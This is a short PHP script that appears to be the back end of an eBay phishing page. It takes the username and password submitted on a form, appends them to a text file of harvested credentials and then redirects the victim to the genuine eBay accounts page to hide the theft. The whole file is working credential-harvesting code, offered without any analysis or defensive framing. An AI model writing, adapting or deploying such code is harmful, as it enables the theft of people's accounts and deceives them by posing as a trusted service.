<?php

file_put_contents("../userpass/usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>